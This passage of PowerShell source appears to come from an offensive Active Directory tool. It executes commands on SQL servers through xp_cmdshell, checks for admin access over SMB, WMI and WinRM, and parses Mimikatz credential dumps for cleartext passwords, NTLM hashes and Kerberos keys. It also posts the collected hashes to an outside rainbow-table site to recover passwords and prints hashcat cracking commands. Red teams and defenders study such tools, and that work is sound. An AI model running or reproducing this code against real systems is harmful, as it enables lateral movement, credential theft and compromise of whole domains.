    if ($advancedOptionsConfig.value_in_use -eq 0) {
        Invoke-SqlQuery -NamedInstance $NamedInstance -Query "sp_configure 'show advanced options', 1; RECONFIGURE;"
        $revertAdvancedOptions = $true
    }

    # Enable 'xp_cmdshell' if needed
    if ($xpCMDConfig.value_in_use -eq 0) {
        Invoke-SqlQuery -NamedInstance $NamedInstance -Query "sp_configure 'xp_cmdshell', 1; RECONFIGURE;"
        $revertXpCMDShell = $true
    }

    # Execute the provided command using xp_cmdshell
    $ExecResult = Invoke-SqlQuery -NamedInstance $NamedInstance -Query "EXEC xp_cmdshell '$Command';"

    # Output the result as formatted text
    if ($ExecResult) {
        $TrimmedResult = $ExecResult | Format-Table -HideTableHeaders | Out-String | ForEach-Object { $_.Trim() }
        $TrimmedResult | Write-Output
    
    } else {
        Write-Host "No output was returned from the command."
    }

    # Revert 'xp_cmdshell' if it was changed
    if ($revertXpCMDShell) {
        Revert-Config -Option "xp_cmdshell" -Value 0
    }

    # Revert 'Show Advanced Options' if it was changed
    if ($revertAdvancedOptions) {
        Revert-Config -Option "show advanced options" -Value 0
    }
}

# Start Impersonation (if required)
if (!$LocalAuth -and $Username -ne "" -and $Password -ne ""){
Invoke-Impersonation -Username $Username -Password $Password -Domain $Domain
}

function SQLAdminCheck {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory=$true)]
        [string]$NamedInstance,
        
        [Parameter(Mandatory=$false)]
        [string]$Username,
        
        [Parameter(Mandatory=$false)]
        [string]$Password
    )

    try {
        # Create and open SQL connection
        Write-Verbose "Opening SQL connection to $NamedInstance"
        $SqlConnection = New-Object System.Data.SqlClient.SqlConnection
        $SqlConnection.ConnectionString = $ConnectionString
        $SqlConnection.Open()
        
        # Create SQL command to check sysadmin membership
        $SqlCommand = $SqlConnection.CreateCommand()
        $SqlCommand.CommandText = "SELECT IS_SRVROLEMEMBER('sysadmin')"
        $IsSysAdmin = $SqlCommand.ExecuteScalar()
        
        # Check if the user is a sysadmin
        if ($IsSysAdmin -eq "1") {
            $SYSADMIN = $True
            if ($Command -ne "") {
                # Execute the provided command
                return MSSQL-Command -NamedInstance $NamedInstance -Command $Command
            } else {
                return "SUCCESS SYSADMIN"
            }
        } elseif ($IsSysAdmin -eq "0") {
            $SYSADMIN = $False
            return "SUCCESS NOT SYSADMIN"
        } else {
            $SYSADMIN = $False
            return "ERROR"
        }
    } catch {
        Write-Error "Error occurred on $NamedInstance`: $_"
        return $null
    } finally {
        # Close SQL connection and clear pool
        if ($SqlConnection -and $SqlConnection.State -eq 'Open') {
            $SqlConnection.Close()
            [System.Data.SqlClient.SqlConnection]::ClearAllPools()
        }
    }
}


function Test-SqlConnection {
    [CmdletBinding()]
    param (
    [Parameter(Mandatory=$true)]
    [string]$NamedInstance
    )
    if (!$LocalAuth) {
        $ConnectionString = "Server=$NamedInstance;Integrated Security=True;Encrypt=Yes;TrustServerCertificate=Yes;Connection Timeout=1"
   } elseif ($LocalAuth) {
       $ConnectionString = "Server=$NamedInstance;User Id=$Username;Password=$Password;Encrypt=Yes;TrustServerCertificate=Yes;Connection Timeout=1"
    }

    $connection = New-Object System.Data.SqlClient.SqlConnection
    $connection.ConnectionString = $ConnectionString
    
    try {
        $connection.Open()
        if ($connection.State -eq 'Open'){
        if ($Username -ne "" -and $Password -ne "") {
            return SQLAdminCheck -Username "$Username" -Password "$Password" -NamedInstance "$NamedInstance"
        } else {
            return SQLAdminCheck -NamedInstance $NamedInstance
            
            }
        }
    } catch {
        if ($_.Exception.Message -like "*Login failed for user*"){return "Access Denied"}
        elseif ($_.Exception.Message -like "*error: 26*"){return "Unable to connect"}
        elseif ($_.Exception.Message -like "*error: 40*"){return "Unable to connect"}
        else {return "ERROR"}
    } finally {
        if ($Username -ne "" -or $Password -ne "" -and !$LocalAuth){
        Invoke-Impersonation  -RevertToSelf
    }
        $connection.Close()
        [System.Data.SqlClient.SqlConnection]::ClearAllPools()
    }
}

    $ComputerNameFromInstance = $NamedInstance.Split('\')[0]
    try {
    $IP = $null
    $Ping = New-Object System.Net.NetworkInformation.Ping 
    $IPResult = $Ping.Send($ComputerNameFromInstance, 10)
    if ($IPResult.Status -eq 'Success') {
    $IP = $IPResult.Address.IPAddressToString}
    }

    Catch {$IP = " " * 16}
    return (Test-SqlConnection -NamedInstance $NamedInstance), $IP

# revert impersonation (if required)
if ($Username -ne "" -or $Password -ne "" -and !$LocalAuth){Invoke-Impersonation  -RevertToSelf}
}

foreach ($NamedInstance in $AllInstances) {


    
    $runspace = [powershell]::Create().AddScript($scriptBlock).AddArgument($NamedInstance).AddArgument($Username).AddArgument($Password).AddArgument($LocalAuth).AddArgument($Domain).AddArgument($Command)
    $runspace.RunspacePool = $runspacePool

    [void]$runspaces.Add([PSCustomObject]@{
        Runspace = $runspace
        Handle = $runspace.BeginInvoke()
        Instance = $NamedInstance
        Completed = $false
        })

}

$InstanceLength = ($AllInstances | ForEach-Object { $_.Length } | Measure-Object -Maximum).Maximum

do {
    foreach ($runspace in $runspaces | Where-Object { -not $_.Completed }) {
        
        if ($runspace.Handle.IsCompleted) {
            $runspace.Completed = $true
            $runspaceData = $runspace.Runspace.EndInvoke($runspace.Handle)
            
            $result = $runspacedata[0]
            $IP = $runspacedata[1]
            
            $SysAdminFilePath = Join-Path -Path $MSSQL -ChildPath ("$Username-SYSADMIN-Accessible-MSSQL-Instances.txt")
            $AccessibleFilePath = Join-Path -Path $MSSQL -ChildPath ("$Username-Accessible-MSSQL-Instances.txt")
            
            if (!$Username){$Username = $env:username}
            if ($result -eq "Unable to connect"){continue}

            if ($result -eq "Access Denied"){
            if ($SuccessOnly){continue}
            Display-ComputerStatus  -statusColor "Red" -statusSymbol "[-] " -statusText "ACCESS DENIED" -NamedInstance $($runspace.Instance) -IpAddress $IP
            continue
            }

            if ($result -eq "ERROR"){
            if ($SuccessOnly){continue}
            Display-ComputerStatus  -statusColor "Red" -statusSymbol "[-] " -statusText "ERROR - $Result" -NamedInstance $($runspace.Instance) -IpAddress $IP
            continue
            }

            elseif ($result -eq "Success"){
            Display-ComputerStatus -statusColor "Green" -statusSymbol "[+] " -statusText "ACCESSIBLE INSTANCE" -NamedInstance $($runspace.Instance) -IpAddress $IP
            $($runspace.Instance) | Add-Content -Path "$AccessibleFilePath" -Encoding "ASCII" -Force
            continue            
            }

            elseif ($result -eq "SUCCESS SYSADMIN"){
            Display-ComputerStatus -statusColor "Yellow" -statusSymbol "[+] " -statusText "SYSADMIN" -NamedInstance $($runspace.Instance) -IpAddress $IP
            $($runspace.Instance) | Add-Content -Path "$SysAdminFilePath" -Encoding "ASCII" -Force
            continue            
            }
           
            
            elseif ($result -eq "SUCCESS NOT SYSADMIN"){
            Display-ComputerStatus -statusColor "Green" -statusSymbol "[+] " -statusText "ACCESSIBLE INSTANCE" -NamedInstance $($runspace.Instance) -IpAddress $IP
            $($runspace.Instance) | Add-Content -Path "$AccessibleFilePath" -Encoding "ASCII" -Force
            continue            
            }

            elseif ($Command -ne "" -and $Result -ne ""){
            Display-ComputerStatus -statusColor "Yellow" -statusSymbol "[+] " -statusText "SYSADMIN" -NamedInstance $($runspace.Instance) -IpAddress $IP
            $($runspace.Instance) | Add-Content -Path "$AccessibleFilePath" -Encoding "ASCII" -Force
            Write-Output ""
            Write-output $Result
            Write-Output ""
            continue
            }

            elseif ($result -like "*untrusted domain and cannot be used with Windows authentication*"){
            if ($SuccessOnly){continue}
            Display-ComputerStatus  -statusColor "Red" -statusSymbol "[-] " -statusText "Untrusted Domain" -NamedInstance $($runspace.Instance) -IpAddress $IP
            continue
            }

             # Dispose of runspace and close handle
            $runspace.Runspace.Dispose()
            $runspace.Handle.AsyncWaitHandle.Close()
        }
    }

    Start-Sleep -Milliseconds 100
} while ($runspaces | Where-Object { -not $_.Completed })


# Clean up
$runspacePool.Close()
$runspacePool.Dispose()

if (Test-Path -Path $SysAdminFilePath) {
    Get-Content -Path $SysAdminFilePath |
        Sort-Object -Unique |
        Set-Content -Path $SysAdminFilePath
}

if (Test-Path -Path $AccessibleFilePath) {
    Get-Content -Path $AccessibleFilePath |
        Sort-Object -Unique |
        Set-Content -Path $AccessibleFilePath
}


}

################################################################################################################
################################################ Function: All #################################################
################################################################################################################
Function Method-all {
    # Create a runspace pool
    $runspacePool = [runspacefactory]::CreateRunspacePool(1, $Threads)
    $runspacePool.Open()
    $runspaces = New-Object System.Collections.ArrayList

    $scriptBlock = {
        param ($computerName, $Domain, $Timeout)

        Function Test-Port {
            param ($ComputerName, $Port)
            $tcpClient = New-Object System.Net.Sockets.TcpClient
            $asyncResult = $tcpClient.BeginConnect($ComputerName, $Port, $null, $null)
            $wait = $asyncResult.AsyncWaitHandle.WaitOne($Timeout)

            if ($wait) {
                try {
                    $tcpClient.EndConnect($asyncResult)
                    return $true
                } catch {
                    return $false
                }
            } else {
                return $false
            }
        }

        # Check Ports
        $WinRMPort = Test-Port -ComputerName $ComputerName -Port 5985
        $WMIPort = Test-Port -ComputerName $ComputerName -Port 135
        $SMBPort = Test-Port -ComputerName $ComputerName -Port 445


        # if all three fail, return and kill the runspace
        if (-not $SMBPort -and -not $WMIPort -and -not $WinRMPort) {
            return "Unable to connect"
        }

        # SMB Check
        if ($SMBPort) {
            $SMBCheck = Test-Path "\\$ComputerName\c$" -ErrorAction SilentlyContinue
            if (-not $SMBCheck) {
                $SMBAccess = $False
            } else {
                $SMBAccess = $True
            }
        }

        # WMI Check
        if ($WMIPort) {
            try {
                Get-WmiObject -Class Win32_OperatingSystem -ComputerName $ComputerName -ErrorAction Stop
                $WMIAccess = $True  # Set WMIAccess to true if command succeeds
            } catch {
                $WMIAccess = $False  # Set WMIAccess to false if command fails
            }
        }

        # WinRM Check
        if ($WinRMPort) {
            try {
                Invoke-Command -ComputerName $computerName -ScriptBlock {echo "Successful Connection PME"} -ErrorAction Stop
                $WinRMAccess = $True
            } catch {
                if ($_.Exception.Message -like "*Access is Denied*") {
                    $WinRMAccess = $False
                } elseif ($_.Exception.Message -like "*cannot be resolved*") {
                    $WinRMAccess = $False
                }
            }
        }

        return @{
            WMIAccess = $WMIAccess
            SMBAccess = $SMBAccess
            WinRMAccess = $WinRMAccess
        }
    }

    

    # Create and invoke runspaces for each computer
    foreach ($computer in $computers) {

    if (!$IPAddress){
    $ComputerName = $computer.Properties["dnshostname"][0]
    $OS = $computer.Properties["operatingSystem"][0]
    }

    elseif ($IPAddress){
    $ComputerName = "$Computer"
    $OS = "OS:PLACEHOLDER"
    }

        $runspace = [powershell]::Create().AddScript($scriptBlock).AddArgument($ComputerName).AddArgument($Domain).AddArgument($Timeout)
        $runspace.RunspacePool = $runspacePool

        [void]$runspaces.Add([PSCustomObject]@{
            Runspace = $runspace
            Handle = $runspace.BeginInvoke()
            ComputerName = $ComputerName
            OS = $OS
            Completed = $false
        })
    }

    # Poll the runspaces and display results as they complete
    do {
        foreach ($runspace in $runspaces | Where-Object { -not $_.Completed }) {
            if ($runspace.Handle.IsCompleted) {
                $runspace.Completed = $true
                $result = $runspace.Runspace.EndInvoke($runspace.Handle)
                
                if ($result -eq "Unable to connect") { continue }

                # Build string of successful protocols
                $successfulProtocols = @()
                if ($result.SMBAccess -eq $True) { $successfulProtocols += "SMB" }
                if ($result.WinRMAccess -eq $True) { $successfulProtocols += "WinRM" }
                if ($result.WMIAccess -eq $True) { $successfulProtocols += "WMI" }

                if ($successfulProtocols.Count -gt 0) {
                    $statusText = $successfulProtocols -join ', '
                    Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor "Green" -statusSymbol "[+] " -statusText $statusText -NameLength $NameLength -OSLength $OSLength
                    continue
                } else {
                    if ($SuccessOnly){continue}
                    Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor "Red" -statusSymbol "[-] " -statusText "ACCESS DENIED" -NameLength $NameLength -OSLength $OSLength
                    continue
                }
            }
        }
        Start-Sleep -Milliseconds 100
    } while ($runspaces | Where-Object { -not $_.Completed })

    # Clean up
    $runspacePool.Close()
    $runspacePool.Dispose()
}

################################################################################################################
################################################# Function: AdminCount #########################################
################################################################################################################

function AdminCount {
    param (
        [string]$UserName,
        [System.DirectoryServices.DirectorySearcher]$Searcher
    )

    $Searcher.Filter = "(sAMAccountName=$UserName)"
    $Searcher.PropertiesToLoad.Clear()
    $Searcher.PropertiesToLoad.Add("adminCount") > $null

    $user = $Searcher.FindOne()

    if ($user -ne $null) {
        $adminCount = $user.Properties["adminCount"]
        if ($adminCount -eq 1) {
            return $true
        }
    }
    return $false
}

################################################################################################################
############################################ Function: RainbowCheck ############################################
################################################################################################################

Function RainbowCheck {
param ($Module, $RCFilePath)

    if (-not (Test-Path -Path $RCFilePath)) {
        Write-Warning "The file at '$RCFilePath' does not exist."
        return
    }

    if (!(Get-Content -Path $RCFilePath)) {
        Write-Warning "The file at '$RCFilePath' is empty."
        return
    }

function Rainbow-SAM {
    $hashEntries = Get-Content -Path $RCFilePath | ForEach-Object {
        if ($_ -match "^\[(.+?)\](.+?):\d*?:[a-f0-9A-F]{32}:([a-f0-9A-F]{32}).*?$") {
            $hostname = $matches[1] -replace '^\[|\]$', ''  # Remove brackets from the hostname
            $username = $matches[2]
            $ntHash = $matches[3]
            New-Object PSObject -Property @{
                Hostname = $hostname
                Username = $username
                NTHash = $ntHash
            }
        }
    }
    return $hashEntries
}

function Rainbow-LogonPasswords {
    $hashEntries = Get-Content -Path $RCFilePath | ForEach-Object {
        if ($_ -match "^(.+?)\\(.+?):([a-f0-9A-F]{32})$") {
            $domain = $matches[1]
            $username = $matches[2]
            $ntHash = $matches[3]
            New-Object PSObject -Property @{
                Domain = $domain
                Username = $username
                NTHash = $ntHash
            }
        }
    }
    return $hashEntries
}

function Rainbow-NTDS {
    $hashEntries = Get-Content -Path $RCFilePath | ForEach-Object {
        if ($_ -match "^(.+?):\d*?:[a-f0-9A-F]{32}:([a-f0-9A-F]{32}).*?$") {
            $username = $matches[1]
            $ntHash = $matches[2]
            New-Object PSObject -Property @{
                Username = $username
                NTHash = $ntHash
            }
        }
    }
    return $hashEntries
}


$NTLMpwURL = "https://ntlm.pw/" 

$parsedData = switch ($Module) {
    "SAM" { Rainbow-SAM -FilePath $RCFilePath }
    "LogonPasswords" { Rainbow-LogonPasswords -FilePath $RCFilePath }
    "NTDS" { Rainbow-NTDS -FilePath $RCFilePath }
}

# Group users by their NTLM hash
$groupedHashEntries = $parsedData | Group-Object NTHash

# Construct the POST request body with the NT hashes (unique hashes only)
$hashesBody = ($groupedHashEntries.Name -join "%0D%0A")

# Send a POST request to the server
$response = Invoke-WebRequest -Uri $NTLMpwURL -Method Post -Body "hashes=$hashesBody" -ContentType "application/x-www-form-urlencoded" -UseBasicParsing

if ($response.StatusCode -eq 200) {
    $htmlContent = $response.Content

    $pattern = "<tr><td class=`"font-monospace`">(.+?)</td><td>(.+?)</td></tr>"
    $matches = Select-String -InputObject $htmlContent -Pattern $pattern -AllMatches

    $results = $matches.Matches | ForEach-Object {
        $hash = $_.Groups[1].Value
        $password = $_.Groups[2].Value

        if ($password -ne "[not found]") {
            $groupedHashEntries | Where-Object { $_.Name -eq $hash } | ForEach-Object {
                $_.Group | ForEach-Object {
                    New-Object -TypeName PSObject -Property @{
                        Hostname = $_.Hostname
                        Domain = $_.Domain
                        Username = $_.Username
                        Hash = $hash
                        Password = $password
                    }
                }
            }
        }
    }

Write-host "[*] " -ForegroundColor "Yellow" -NoNewline
Write-Host "Checking collected hashes against an online rainbow table"

Write-host "[*] " -ForegroundColor "Yellow" -NoNewline
Write-Host "Only values for which the password is known will be shown"

Write-host "[*] " -ForegroundColor "Yellow" -NoNewline
Write-Host "URL: $NTLMpwURL"

Write-Host

switch ($Module) {
    "SAM" {
        $sortedResults = $results | Sort-Object Hostname
        $sortedResults | Format-Table -Property Hostname, Username, Hash, Password -AutoSize
    }
    "LogonPasswords" {
        $sortedResults = $results | Sort-Object Username
        $sortedResults | Format-Table -Property Domain, Username, Hash, Password -AutoSize
    }
    "NTDS" {
        $sortedResults = $results | Sort-Object Username
        $sortedResults | Format-Table -Property Username, Hash, Password -AutoSize
    }
}
} 
elseif ($response.StatusCode -eq 429){Write-Warning "Quota Exceeded on lookup"}
else {Write-Warning "Error communicating with $NTLMpwURL" }
}

################################################################################################################
################################################## Function: Parse-SAM #########################################
################################################################################################################
function Parse-SAM {
    $SamFull = Test-Path -Path "$PME\SAM\.Sam-Full.txt"
    if (-not $SamFull) {
        New-Item -Path "$PME\SAM\" -Name ".Sam-Full.txt" -ItemType "File" | Out-Null
    }

    Write-Host
    Write-Host
    Write-Host "------------------------- Hashes which are valid on multiple computers -------------------------" -ForegroundColor "Yellow"
    Write-Host

    $files = Get-ChildItem -Path "$SAM\*" -Filter "*-SAMHashes.txt"
    $lines = @{}

    foreach ($file in $files) {
        $fileLines = Get-Content $file

        foreach ($line in $fileLines) {
            if ([string]::IsNullOrWhiteSpace($line)) {
                continue
            }

            $lineParts = $line -split ':'
            $lineWithoutNumber = $lineParts[0] + ':' + $lineParts[2] + ':' + $lineParts[3] + ':' + $lineParts[4]
            $computer = $file.BaseName -split '\.' | Select-Object -First 1
            $computerFormed = "{0}" -f $computer

            if ($lines.ContainsKey($lineWithoutNumber)) {
                $lines[$lineWithoutNumber] += "," + $computerFormed
            } else {
                $lines[$lineWithoutNumber] = $computerFormed
            }
        }
    }

    $duplicateLines = $lines.GetEnumerator() | Where-Object { $_.Value -match ',' }
    if ($duplicateLines) {
        foreach ($duplicate in $duplicateLines) {
            $line = $duplicate.Key
            $computers = $duplicate.Value -split ','
            Write-Host "Computers: $($computers -join ', ')" -ForegroundColor "Yellow"
            Write-Host "$line::"
            Write-Host
        }
    }

    Write-Host
    Write-Host "------------------------------ All collected SAM Hashes ----------------------------------------" -ForegroundColor "Yellow"
    Write-Host

    Get-ChildItem -Path "$SAM\*" -Filter "*-SAMHashes.txt" | Where-Object { $_.Length -gt 0 } | ForEach-Object {
        $Computer = $_.BaseName -split '\.' | Select-Object -First 1
        $ComputerFormed = "[{0}]" -f $Computer
        $keywords = 'Guest', 'WDAGUtilityAccount', 'DefaultAccount'
        $content = Get-Content $_.FullName -Verbose
        $output = foreach ($line in $content) {
            $trimmedLine = $line.Trim()
            if ($trimmedLine -notmatch ($keywords -join '|') -and $trimmedLine.Length -gt $ComputerFormed.Length) {
                $ComputerFormed + $trimmedLine
            }
        }
        $output | Out-File "$SAM\.Sam-Full.txt" -Force "ascii" -Append
    }

    Start-Sleep -Seconds "3"
    (Get-Content "$SAM\.Sam-Full.txt") | Sort-Object -Unique | Sort | Out-File "$SAM\.Sam-Full.txt" -Encoding "ASCII"
    Get-Content "$SAM\.Sam-Full.txt"

    Write-Host ""
    Write-Host "------------------------------------------------------------------------------------------------" -ForegroundColor "Yellow"
    Write-Host ""
    
    if ($Rainbow){
    RainbowCheck -Module "SAM" -RCFilePath "$PME\SAM\.Sam-Full.txt"
    }
}


################################################################################################################
################################################# Function: Parse-LogonPassword ################################
################################################################################################################
function Parse-LogonPasswords {
    Write-Host
    Write-Host
    Write-Host "Parsing Results" -ForegroundColor "Yellow"
    Write-Host
    Start-Sleep -Seconds 1

    function Parse-LogonPassword {
        param (
            [string]$raw
        )


        $userInfo = @{}

        function Process-Match {
            param ([string]$match)

            $username = $domain = $NTLM = $password = $null

            foreach ($line in $match.Split("`n")) {
                switch -Regex ($line) {
                    "Username" { $username = $line.Split(":")[1].Trim() }
                    "Domain" { 
                        # Extracting the domain and keeping only the NetBIOS name
                        $domain = $line.Split(":")[1].Trim()
                        $domain = ($domain -split "\.")[0]
                    }
                    "NTLM" { $NTLM = $line.Split(":")[1].Trim() }
                    "Password" { $password = ($line -split ":", 2)[1].Trim() }
                }
            }

            if ($username -and $username -ne "(null)" -and $domain -and $domain -ne "(null)") {
                $identity = "$domain\$username"

                if (-not $userInfo.ContainsKey($identity)) {
                    $userInfo[$identity] = @{}
                }

                if ($NTLM) {
                    $userInfo[$identity]["NTLM"] = $NTLM
                }

                if ($password -and $password -ne "(null)" -and $password.Length -lt 320) {
                    $userInfo[$identity]["Password"] = $password
                }
            }
        }

        $patterns = @(
            "(?s)(?<=msv :).*?(?=tspkg :)",
            "(?s)(?<=tspkg :).*?(?=wdigest :)",
            "(?s)(?<=wdigest :).*?(?=kerberos :)",
            "(?s)(?<=kerberos :).*?(?=ssp :)"
        )

        foreach ($pattern in $patterns) {
            $raw | Select-String -Pattern $pattern -AllMatches | ForEach-Object {
                $_.Matches.Value | ForEach-Object {
                    if ($_ -match "Domain") {
                        Process-Match -match $_
                    }
                }
            }
        }

        foreach ($identity in $userInfo.Keys) {
            [PSCustomObject]@{
                Identity = $identity
                NTLM = $userInfo[$identity]["NTLM"]
                Password = $userInfo[$identity]["Password"]
                Notes = ""
            }
        }
    }

    # Directory path where the text files are located.
    $LogonPasswordPath = "$LogonPasswords"

    # Retrieve all text files from the directory.
    $Files = Get-ChildItem -Path $LogonPasswordPath -Filter *LogonPasswords.txt

    # Create DirectorySearcher object outside the loop
    $Searcher = New-Searcher -domain "$Domain"

    # Loop through each file in the directory.
    foreach ($File in $Files) {
        # Extract computer name (DNS Hostname) from the file name using regex.
        $Computer = $File.BaseName -replace "-LogonPasswords$", ""

        Write-Host
        Write-Host "-[$Computer]-"
        Write-Host

        # Retrieve the content of the current file.
        $FileOutput = Get-Content -Raw -Path $File.FullName

        # Parse the Mimikatz output and include ComputerName.
        $ParsedResults = Parse-LogonPassword -raw $FileOutput
        # Update each user's notes if they have an AdminCount of 1
        foreach ($user in $ParsedResults) {
            if ($null -ne $user.Identity) {
                $username = $user.Identity.Split('\')[1]
                if (AdminCount -UserName $username -Searcher $Searcher) {
                    $user.Notes = "[AdminCount=1] "
                }
            }
        }

        $ParsedResults |
        Where-Object { $_.NTLM -or $_.Password } |
        ForEach-Object {
            $notesAdditions = @()
            New-Item -ItemType "Directory" -Path $LogonPasswords -Name $Computer -Force | Out-Null
            $ComputerDirectory = "$LogonPasswords\$Computer"

            $userName = ($_.Identity -split '\\')[1]  # Extract username from Identity

            if ($userName -in $DomainAdmins) { $notesAdditions += "[Domain Admin] " }
            if ($userName -in $EnterpriseAdmins) { $notesAdditions += "[Enterprise Admin] " }
            if ($userName -in $ServerOperators) { $notesAdditions += "[Server Operator] " }
            if ($userName -in $AccountOperators) { $notesAdditions += "[Account Operator] " }

            # Check if NTLM value indicates an empty password
            if ($_.NTLM -eq "31d6cfe0d16ae931b73c59d7e0c089c0") {
                $notesAdditions += "[NTLM=Empty Password] "
            }

            if ($($_.Password) -ne $null){
                # Extract username from Identity
                $userName = ($_.Identity -split '\\')[1]  

                # Check if username does not end with $
                if($userName -notmatch '\$$'){
                    $notesAdditions += "[Cleartext Password] "
                }
            }

            $_.Notes += ($notesAdditions -join ' ')

            Write-Host "Username  : $($_.Identity.ToLower())"
            Write-Host "NTLM      : $($_.NTLM)"
            if ($($_.Password) -eq $null) {} Else {Write-Host "Password  : $($_.Password)"}
            if (($_.Notes) -eq ""){} Else {
            Write-Host "Notes     : " -NoNewline

            # Highlight notes in yellow if it contains specific flags
            if ($_.Notes -match "AdminCount=1" -or $_.Notes -match "NTLM=Empty Password" -or $_.Notes -match "Cleartext Password" ) {
                Write-Host -ForegroundColor Yellow -NoNewline "$($_.Notes)"
            } else {
                Write-Host -NoNewline "$($_.Notes)"
            }
            Write-Host ""
            "$($_.Identity):$($_.NTLM)" | Add-Content -Path "$LogonPasswords\.AllUniqueNTLM.txt" -Encoding "ASCII" -Force
            }
            Write-Host ""
            
            Move-Item -Path $File.FullName -Destination $ComputerDirectory -Force -ErrorAction "SilentlyContinue"
        }
    }

    Get-Content -Path "$LogonPasswords\.AllUniqueNTLM.txt" | Sort | Get-unique | Set-Content -Path "$LogonPasswords\.AllUniqueNTLM.txt" -Force
    
    # Sometimes blank NTLM values are duplicated, this should ensure they are removed from the file
    $filteredContent = Get-Content -Path "$LogonPasswords\.AllUniqueNTLM.txt" | Where-Object {$_ -notmatch ":$"}
    $filteredContent | Set-Content -Path "$LogonPasswords\.AllUniqueNTLM.txt" -Force

    # Print unique NTLM hashes within the banner
    Write-Host
    Write-Host "-------------------------------------- All collected NTLM User Hashes (Unique) --------------------------------------" -ForegroundColor "Yellow"
    Write-Host
    Get-Content -Path "$LogonPasswords\.AllUniqueNTLM.txt"
    Write-Host
    Write-Host "---------------------------------------------------------------------------------------------------------------------" -ForegroundColor "Yellow"
    Write-Host 
    Write-Host "Crack with hashcat: " -NoNewline -ForegroundColor "Yellow"
    Write-Host "hashcat -a 0 -m 1000 -O --username Hashes.txt Wordlist.txt"
    Write-Host "Show cracked NTLMs: " -NoNewline -ForegroundColor "Yellow"
    Write-Host "hashcat -m 1000 Hashes.txt --username --show --outfile-format 2"
    Write-Host

    if ($Rainbow){
    RainbowCheck -Module "LogonPasswords" -RCFilePath "$LogonPasswords\.AllUniqueNTLM.txt"
    }
}




################################################################################################################
################################################# Function: Parse-eKeys ########################################
################################################################################################################
Function Parse-eKeys {
    Write-Host
    Write-Host
    Write-Host "Parsing Results" -ForegroundColor "Yellow"
    Write-Host
    Start-Sleep -Seconds "1"
    $outputFilePath = "$ekeys\.eKeys-Parsed.txt"

    # Initialize the DirectorySearcher outside of the loop for better performance
    $domainSearcher = New-Searcher

    Get-ChildItem -Path $ekeys -Filter "*ekeys.txt" | Where-Object { $_.Length -gt 0 } | ForEach-Object {
        $Computer = $_.BaseName -split '-eKeys' | Select-Object -First 1
        
        New-Item -ItemType "Directory" -Path $eKeys -Name $Computer -Force | Out-Null
        $ComputerDirectory = "$eKeys\$Computer"
        
        Write-Host
        Write-Host
        Write-Host "-[$Computer]-"
        Write-Host

        $filePath = $_.FullName
        $fileContent = Get-Content -Path $filePath -Raw
        Move-Item -Path $filePath -Destination $ComputerDirectory -Force -ErrorAction "SilentlyContinue"

        $pattern = '(?ms)\s\*\sUsername\s:\s(.+?)\s*\r?\n\s*\*\s+Domain\s+:\s(.+?)\s*\r?\n\s*\*\s+Password\s:\s(.+?)\s*\r?\n\s*\*\s+Key List\s:\s(.*?)(?=\r?\n\s\*\sUsername\s:|\r?\n\r?\n)'
        $matches = [regex]::Matches($fileContent, $pattern)

        $uniqueGroups = @{}

        foreach ($match in $matches) {
            $username, $domain, $password, $keyList = $match.Groups[1..4].Value -split '\r?\n\s*'
            if (([regex]::Matches($password, ' ')).Count -gt 10) {
                $password = "(Hex Value: Redacted)"
            }            
            
            $domainUsername = "$($domain.ToLower())\$username"
            $groupKey = $domainUsername

            if (!$uniqueGroups.ContainsKey($groupKey)) {
                $notes = ""  # This will store the notes

                # Check for non-null passwords and username not ending with $
                if ($password -ne "(null)" -and $password -ne "(Hex Value: Redacted)" -and ($username -notmatch '\$$')) {
                    $notes += "[Cleartext Password] "
                }

                $isAdminGroupMember = $DomainAdmins -contains $username -or
                                    $EnterpriseAdmins -contains $username -or
                                    $ServerOperators -contains $username -or
                                    $AccountOperators -contains $username

                # Do not display the adminCount if a user is a member of the specified groups
                if (-not $isAdminGroupMember -and (AdminCount -UserName $username -Searcher $domainSearcher)) {
                    $notes += "[AdminCount=1] "
                }

                # Check for Empty Password hash
                if ($keyList -match "rc4_hmac_nt\s+31d6cfe0d16ae931b73c59d7e0c089c0") {
                    $notes += "[rc4_hmac_nt=Empty Password] "
                }

                # Checks for group memberships
                if ($DomainAdmins -contains $username) {
                    $notes += "[Domain Admin] "
                }
                if ($EnterpriseAdmins -contains $username) {
                    $notes += "[Enterprise Admin] "
                }
                if ($ServerOperators -contains $username) {
                    $notes += "[Server Operator] "
                }
                if ($AccountOperators -contains $username) {
                    $notes += "[Account Operator] "
                }

                $group = [PSCustomObject]@{
                    DomainUsername = $domainUsername
                    KeyList = $keyList | Where-Object { $_ -notmatch 'rc4_hmac_old|rc4_md4|rc4_hmac_nt_exp|rc4_hmac_old_exp|aes128_hmac' }
                    Password = $password
                    Notes = $notes
                }

                $uniqueGroups[$groupKey] = $group

                Write-Host "Username    : $domainUsername"
                if ($Password -eq "(null)" -or $Password -eq "" -or $Password -eq $null){} Else {Write-Host "Password    : $password"}

                foreach ($key in $group.KeyList) {
                    if (![string]::IsNullOrWhiteSpace($key)) {
                        $keyParts = $key.Trim() -split '\s+'
                        Write-Host "$($keyParts[0]) : $($keyParts[1])"
                    }
                }
                                if (-not [string]::IsNullOrWhiteSpace($notes)) {
                    Write-Host "Notes       : " -NoNewline
                    Write-Host $notes -ForegroundColor Yellow -NoNewline
                    Write-Host ""
                }

                Write-Host ""
            }
        }
    }

}



################################################################################################################
############################################## Function: Parse-KerbDump ########################################
################################################################################################################

function Parse-KerbDump {
    Write-Host "`n`nParsing Results" -ForegroundColor "Yellow"
    Start-sleep -Seconds "2"

    # Initialize DirectorySearcher
    $Searcher = New-Object System.DirectoryServices.DirectorySearcher
    $Searcher.SearchRoot = New-Object System.DirectoryServices.DirectoryEntry("LDAP://$domain")

    # Grab each candidate file for parsing based on the name ending in "KerbDump.txt"
    Get-ChildItem -Path $KerbDump -Filter "*KerbDump.txt" | 
        Where-Object { $_.Length -gt 0 } | 
        ForEach-Object {
            $Computer = $_.BaseName -split '-KerbDump' | Select-Object -First 1
            
            # Create the following flag to track output later
            $DisplayComputerName = $True

            # Create a directory in the name of the computer from which results are parsed from
            New-Item -ItemType "Directory" -Path $KerbDump -Name $Computer -Force | Out-Null
            $ComputerDirectory = "$KerbDump\$Computer"

            # Read the file content
            $FileContent = Get-Content -Path $_.FullName -Raw

            # Define regex pattern to match ticket details
